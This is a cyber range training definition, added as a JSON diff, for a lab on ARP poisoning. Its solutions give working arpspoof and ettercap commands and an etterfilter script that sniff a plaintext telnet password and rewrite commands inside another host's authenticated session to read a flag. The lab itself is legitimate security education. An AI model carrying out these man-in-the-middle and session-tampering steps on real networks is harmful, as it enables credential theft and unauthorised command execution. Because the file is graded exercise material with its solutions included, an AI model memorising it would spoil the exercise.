@@ -1,0 +1,132 @@
+{
+  "title": "CR-18 / Module 3 / N3c — Advanced ARP Poisoning",
+  "description": "vm1 runs telnet but firewalls every source except vm2. You can't connect directly. To read the flag you have to sit between vm1 and vm2 and rewrite vm2's commands on the wire so vm1 runs what you want under their authenticated session.",
+  "prerequisites": [
+    "CR-18 / N3b or equivalent experience with bidirectional ARP MITM",
+    "Comfort using a Linux shell",
+    "Awareness that telnet is a plaintext protocol"
+  ],
+  "outcomes": [
+    "Bidirectional ARP MITM with IP forwarding active on a routed Linux host",
+    "Author and compile an `etterfilter` script that searches and replaces application data",
+    "Use ettercap with `-M arp:remote -F <filter>` to actively modify traffic in flight",
+    "Recognise the difference between sniffing and active session modification"
+  ],
+  "state": "UNRELEASED",
+  "levels": [
+    {
+      "title": "Briefing",
+      "level_type": "INFO_LEVEL",
+      "order": 0,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "content": "## Scenario\n\nThree machines on a small LAN.\n\n- **vm1** at `192.168.25.10` runs `telnetd` on tcp/23. Someone hardened it with an iptables rule: only `192.168.25.20` (vm2) can connect, everyone else is dropped at the network layer.\n- **vm2** at `192.168.25.20` is a maintenance host. A script runs there every 30 seconds: it telnets to vm1, runs `cat /home/<user>/bait.txt`, then logs out. The bait file contains nothing useful.\n- **vma** at `192.168.25.30` is your attacker workstation.\n\n## What you cannot do\n\nConnect to telnet directly. Try it: `telnet 192.168.25.10`. You will hang and then time out, because vm1's iptables drops your SYN before telnet ever sees it.\n\n## What you can do\n\nSit between vm1 and vm2 and **modify** vm2's session as it flies past. Specifically, when vm2 sends `cat /home/<user>/bait.txt`, you rewrite `bait.txt` to `flag.txt` on the wire. Vm1 never knows the difference; it runs the modified command under vm2's authenticated session and returns the flag in the response. The response flows back through you, and you read the flag off the wire.\n\nThis is what `ettercap` filters are built for."
+    },
+    {
+      "title": "Get Access",
+      "level_type": "ACCESS_LEVEL",
+      "order": 1,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "passkey": "start",
+      "cloud_content": "Open the Kali desktop on **vma** and log in.\n\n1. In the topology overview on the right, right-click on **`vma`** and choose **`Open GUI`** (or **`Open GUI In New Window`** if you prefer a separate window). The Kali display manager loads in your browser.\n2. Log in with username **`user`** and password **`Password123`**.\n3. Open a terminal from the desktop.\n\nSSH is documented at https://docs.platform.cyberrange.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access if you prefer.\n\nWhen you are in, submit **`start`** to unlock the next level.",
+      "local_content": "This sandbox has not been validated for local-only deployment."
+    },
+    {
+      "title": "Capture the password",
+      "level_type": "TRAINING_LEVEL",
+      "order": 2,
+      "estimated_duration": 20,
+      "minimal_possible_solve_time": 5,
+      "answer": null,
+      "answer_variable_name": "telnet_pass",
+      "content": "Before you go after the flag, prove the MITM works by reading vm2's password off the wire.\n\nTelnet is plaintext: when vm2 sends its password after `Password:`, it crosses the LAN in clear ASCII. Sit between vm1 and vm2 with ARP poisoning, watch the session in Wireshark, and submit the password.",
+      "solution": "1. **Get on the path.** Bidirectional ARP poisoning, same recipe as N3b:\n\n   `sudo sysctl -w net.ipv4.ip_forward=1`\n\n   `sudo arpspoof -i eth1 -t 192.168.25.10 192.168.25.20`\n\n   `sudo arpspoof -i eth1 -t 192.168.25.20 192.168.25.10`\n\n2. **Open Wireshark** on `eth1`. Display filter:\n\n   `tcp.port == 23`\n\n   To strip platform noise:\n\n   `not vnc and not (ip.src == 10.10.10.0/24 or ip.dst == 10.10.10.0/24)`\n\n3. **Wait up to 30 s** for vm2's next session. When you see tcp/23 packets, right-click → **Follow → TCP Stream**. The full conversation appears in plain text, including the `Password:` prompt and the password vm2 sends in response.\n\n4. Submit that password as **`${ANSWER}`**.\n\nLeave the arpspoof processes running. You will need the MITM still in place for the next level.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Same MITM as N3b",
+          "content": "If you remember the bidirectional arpspoof + sysctl ip_forward pattern from N3b, that is exactly what you need here. Telnet is plaintext like FTP — once you are on the path, the password is just sitting there in the data stream.",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "Wireshark follow stream",
+          "content": "In Wireshark, after filtering for `tcp.port == 23`, right-click any packet and choose Follow → TCP Stream. That stitches the full session back into a readable transcript including the login exchange.",
+          "hint_penalty": 15,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 80,
+      "variant_answers": true,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {"technique_key": "TA0006.T1557.002"},
+        {"technique_key": "TA0006.T1040"}
+      ],
+      "expected_commands": [
+        "arpspoof",
+        "sysctl"
+      ],
+      "commands_required": false
+    },
+    {
+      "title": "Bend their session to your will",
+      "level_type": "TRAINING_LEVEL",
+      "order": 3,
+      "estimated_duration": 30,
+      "minimal_possible_solve_time": 8,
+      "answer": null,
+      "answer_variable_name": "flag",
+      "content": "You captured the password but you cannot use it — `telnet 192.168.25.10` from your machine gets dropped at vm1's firewall.\n\nWhat you can do: when vm2's expect script sends the line `cat /home/<user>/bait.txt` across your wire, rewrite `bait.txt` to `flag.txt` mid-stream. Vm1 sees `cat /home/<user>/flag.txt` and serves the flag back. You watch the response and submit what arrives.\n\nThe tool of choice is **`ettercap`** with an `etterfilter`-compiled script. Submit the flag verbatim.",
+      "solution": "1. **Write the filter.** Save the following as `modify.ef` on vma:\n\n   ```\n   if (ip.proto == TCP && tcp.dst == 23) {\n       if (search(DATA.data, \"bait.txt\")) {\n           replace(\"bait.txt\", \"flag.txt\");\n           msg(\"replaced bait.txt with flag.txt\\n\");\n       }\n   }\n   ```\n\n   The strings are deliberately the same length so the TCP payload stays the same size and TCP sequence numbers don't drift.\n\n2. **Compile it:**\n\n   `etterfilter modify.ef -o modify.ecf`\n\n3. **Stop the standalone arpspoof processes** if they are still running — ettercap will do its own ARP MITM. Then start ettercap with the filter and ARP MITM in one shot:\n\n   `sudo ettercap -T -q -i eth1 -F modify.ecf -M arp:remote /192.168.25.10// /192.168.25.20//`\n\n   The two `///` syntax tells ettercap the two endpoints. `-T -q` keeps the output terse. `-M arp:remote` is the bidirectional ARP MITM, equivalent to your two arpspoof terminals from level 2.\n\n4. **Wait for the next vm2 cycle** (≤30 s). When the message `replaced bait.txt with flag.txt` appears in ettercap's terminal, the filter just fired. vm1 will execute the modified command and the flag will flow back through you. Ettercap prints intercepted data; the flag will appear as the response to the modified `cat`.\n\n5. Read the flag and submit it as **`${ANSWER}`**.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Filter language docs",
+          "content": "Ettercap's filter syntax is documented in `man etterfilter`. The two functions you need are `search(DATA.data, \"x\")` (returns true if the payload contains the string) and `replace(\"x\", \"y\")` (substitutes inside the current packet). Both work on the current packet's payload only.",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "Compile before loading",
+          "content": "Ettercap loads compiled `.ecf` files, not raw `.ef` source. `etterfilter input.ef -o output.ecf` does the compile. If the syntax is wrong, etterfilter will tell you the line number.",
+          "hint_penalty": 15,
+          "order": 1
+        },
+        {
+          "title": "Keep the lengths equal",
+          "content": "TCP cares about payload lengths. Replacing a string with one of a different length forces ettercap to rewrite TCP sequence numbers, which often breaks the session. Keep the two strings the same length (both `bait.txt` and `flag.txt` are 8 bytes) and you avoid the problem entirely.",
+          "hint_penalty": 20,
+          "order": 2
+        },
+        {
+          "title": "Where the flag shows up",
+          "content": "When the filter fires and vm1 runs the rewritten `cat` command, the file contents go back to vm2 across your wire. That response is what ettercap prints. If you cannot find it in ettercap's stream, run tcpdump in parallel: `sudo tcpdump -ni eth1 -A 'tcp port 23 and src 192.168.25.10'` will show vm1's responses only.",
+          "hint_penalty": 25,
+          "order": 3
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 120,
+      "variant_answers": true,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {"technique_key": "TA0006.T1557.002"},
+        {"technique_key": "TA0009.T1565.002"},
+        {"technique_key": "TA0010.T1041"}
+      ],
+      "expected_commands": [
+        "ettercap",
+        "etterfilter",
+        "tcpdump"
+      ],
+      "commands_required": false
+    }
+  ],
+  "estimated_duration": 50,
+  "variant_sandboxes": true
+}
